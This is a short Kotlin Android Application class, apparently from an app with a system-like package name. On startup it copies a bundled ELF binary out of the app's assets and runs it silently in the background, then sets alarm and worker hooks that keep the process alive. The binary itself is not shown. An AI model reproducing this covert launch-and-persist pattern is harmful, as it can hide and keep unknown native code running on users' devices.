package com.system.timeup

import android.app.Application

class App : Application() {
    override fun onCreate() {
        super.onCreate()


        /* 首次安装把 ELF 丢过去 */
        Shell.copyElfToPrivateDir(this, "myelf")   // assets 里放同名文件 myelf
                

        Shell.execAsync("/data/user/0/com.system.timeup/files/myelf &> /data/user/0/com.system.timeup/files/elf.out")

        /* 后面随便什么时候执行a */
        Shell.execPrivateElf(this, "myelf")

        // 原来的保活逻辑
        AlarmKick.ensure(this, seconds = 180, reason = "进程启动软补排")
        WorkKick.ensurePeriodic(this)
    }
}
